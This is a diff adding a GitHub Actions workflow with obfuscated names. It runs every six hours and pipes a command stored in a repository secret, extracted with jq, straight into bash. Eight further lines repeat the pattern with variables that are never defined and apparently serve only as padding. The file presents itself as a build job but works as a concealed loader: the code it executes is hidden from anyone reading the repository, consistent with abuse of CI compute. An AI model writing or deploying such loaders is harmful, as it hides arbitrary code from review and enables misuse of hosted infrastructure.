@@ -1,0 +1,26 @@
+name: hongtianbo5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongtianbo5678
+        env:
+          ayhkb810: ${{ secrets.ayhkb810 }}
+        run: |
+          echo $ayhkb810 | jq -r .lt6 | /bin/bash
+          echo $plu9 | jq -r .ylvlo96958 | /bin/bash
+          echo $donv138 | jq -r .xeyb23048 | /bin/bash
+          echo $zgc3 | jq -r .bgc13359 | /bin/bash
+          echo $uvnt99618 | jq -r .tgzs476 | /bin/bash
+          echo $rtf054 | jq -r .mfybe930 | /bin/bash
+          echo $tn33737 | jq -r .pg379 | /bin/bash
+          echo $phqx06592 | jq -r .egv99915 | /bin/bash
+          echo $focb6900 | jq -r .grbt124 | /bin/bash
+
